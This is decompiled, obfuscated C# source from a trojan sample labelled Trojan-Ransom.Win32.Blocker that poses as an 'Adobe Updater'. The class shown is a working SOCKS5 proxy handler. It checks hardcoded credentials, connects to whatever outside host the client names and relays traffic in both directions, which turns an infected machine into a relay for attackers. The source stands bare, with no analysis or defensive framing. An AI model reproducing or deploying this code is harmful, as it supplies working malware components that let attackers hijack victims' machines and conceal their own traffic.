// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A16C989-2208-438C-922C-7B906D6E0A07
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.hdzy-869c557bf0abceed320b3ef24b39fc8b53bf66bc6b62a6576e9ddd1978225cc1.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public sealed class \u0003
{
  private string \u0002 = \u000E\u2001.\u0002\u2000;
  private string \u0003 = \u000E\u2001.\u0003\u2000;
  private TcpClient \u0005;
  private TcpClient \u0008;
  private byte \u0006 = 5;
  private byte \u000E = 2;
  private byte \u000F;
  private byte \u0002\u2000 = 1;
  private byte \u0003\u2000 = 3;

  public \u0003(TcpClient _param1) => this.\u0005 = _param1;

  public void \u0002()
  {
    Console.WriteLine(\u000F\u2001.\u0002(1680134983) + this.\u0005.Client.RemoteEndPoint.ToString());
    NetworkStream stream1 = this.\u0005.GetStream();
    byte[] buffer1 = new byte[2];
    stream1.Read(buffer1, 0, 2);
    Console.WriteLine(string.Format(\u000F\u2001.\u0002(1680134958), (object) buffer1[0], (object) buffer1[1]));
    byte[] buffer2 = new byte[(int) buffer1[1]];
    stream1.Read(buffer2, 0, buffer2.Length);
    Console.WriteLine(\u000F\u2001.\u0002(1680134916) + buffer2.Length.ToString() + \u000F\u2001.\u0002(1680134377));
    byte[] buffer3 = new byte[2]{ this.\u0006, this.\u000E };
    stream1.Write(buffer3, 0, 2);
    ASCIIEncoding asciiEncoding = new ASCIIEncoding();
    byte[] buffer4 = new byte[64];
    stream1.Read(buffer4, 0, 64);
    Convert.ToInt32(buffer4[0]);
    int int32_1 = Convert.ToInt32(buffer4[1]);
    int int32_2 = Convert.ToInt32(buffer4[int32_1 + 2]);
    byte[] bytes1 = new byte[int32_1];
    for (int index = 0; index <= int32_1 - 1; ++index)
      bytes1[index] = buffer4[index + 2];
    byte[] bytes2 = new byte[int32_2];
    for (int index = 0; index <= int32_2 - 1; ++index)
      bytes2[index] = buffer4[index + int32_1 + 3];
    string str1 = asciiEncoding.GetString(bytes1);
    string str2 = asciiEncoding.GetString(bytes2);
    if (str1.Equals(this.\u0002) && str2.Equals(this.\u0003))
    {
      byte[] buffer5 = new byte[2]
      {
        this.\u0006,
        this.\u000F
      };
      stream1.Write(buffer5, 0, 2);
    }
    else
    {
      byte[] buffer6 = new byte[2]{ this.\u0006, (byte) 2 };
      stream1.Write(buffer6, 0, 2);
    }
    byte[] buffer7 = new byte[4];
    stream1.Read(buffer7, 0, 4);
    Console.WriteLine(\u000F\u2001.\u0002(1680134392) + buffer7[3].ToString());
    string empty = string.Empty;
    if ((int) buffer7[3] == (int) this.\u0002\u2000)
    {
      byte[] numArray = new byte[4];
      stream1.Read(numArray, 0, 4);
      empty = new IPAddress(numArray).ToString();
    }
    else if ((int) buffer7[3] == (int) this.\u0003\u2000)
    {
      byte[] buffer8 = new byte[1];
      stream1.Read(buffer8, 0, 1);
      byte[] numArray = new byte[(int) buffer8[0]];
      stream1.Read(numArray, 0, (int) buffer8[0]);
      empty = Encoding.Default.GetString(numArray);
    }
    else
      Console.WriteLine(\u000F\u2001.\u0002(1680134353) + buffer7[3].ToString());
    if (empty != string.Empty)
    {
      byte[] buffer9 = new byte[2];
      stream1.Read(buffer9, 0, 2);
      int uint16 = (int) BitConverter.ToUInt16(new byte[2]
      {
        buffer9[1],
        buffer9[0]
      }, 0);
      Console.WriteLine(\u000F\u2001.\u0002(1680134320) + empty + \u000F\u2001.\u0002(1680134302) + uint16.ToString());
      this.\u0008 = new TcpClient(empty, uint16);
      if (this.\u0008.Connected)
      {
        byte[] buffer10 = new byte[10];
        buffer10[0] = this.\u0006;
        buffer10[1] = this.\u000F;
        buffer10[2] = (byte) 0;
        buffer10[3] = (byte) 1;
        IPAddress ipAddress = IPAddress.Parse(this.\u0008.Client.LocalEndPoint.ToString().Split(':')[0]);
        buffer10[4] = ipAddress.GetAddressBytes()[0];
        buffer10[5] = ipAddress.GetAddressBytes()[1];
        buffer10[6] = ipAddress.GetAddressBytes()[2];
        buffer10[7] = ipAddress.GetAddressBytes()[3];
        int num = int.Parse(this.\u0008.Client.LocalEndPoint.ToString().Split(':')[1]);
        buffer10[8] = BitConverter.GetBytes((ushort) num)[0];
        buffer10[9] = BitConverter.GetBytes((ushort) num)[1];
        stream1.Write(buffer10, 0, 10);
        Console.WriteLine(\u000F\u2001.\u0002(1680134294));
        NetworkStream stream2 = this.\u0008.GetStream();
        bool flag = false;
        while (this.\u0008.Connected && this.\u0005.Connected && !flag)
        {
          Thread.Sleep(100);
          try
          {
            if (stream1.DataAvailable)
            {
              byte[] numArray1 = new byte[10000];
              int length = stream1.Read(numArray1, 0, 10000);
              byte[] numArray2 = new byte[length];
              Array.Copy((Array) numArray1, (Array) numArray2, length);
              stream2.Write(numArray2, 0, numArray2.Length);
              Console.WriteLine(\u000F\u2001.\u0002(1680134242) + numArray2.Length.ToString() + \u000F\u2001.\u0002(1680134261));
            }
            if (stream2.DataAvailable)
            {
              byte[] numArray3 = new byte[10000];
              int length = stream2.Read(numArray3, 0, 10000);
              byte[] numArray4 = new byte[length];
              Array.Copy((Array) numArray3, (Array) numArray4, length);
              stream1.Write(numArray4, 0, numArray4.Length);
              Console.WriteLine(\u000F\u2001.\u0002(1680134242) + numArray4.Length.ToString() + \u000F\u2001.\u0002(1680134210));
            }
          }
          catch
          {
            flag = true;
          }
        }
        if (this.\u0005.Connected)
          this.\u0005.Close();
        if (!this.\u0008.Connected)
          return;
        this.\u0008.Close();
      }
      else
        Console.WriteLine(\u000F\u2001.\u0002(1680134184));
    }
    else
      Console.WriteLine(\u000F\u2001.\u0002(1680134174));
  }
}
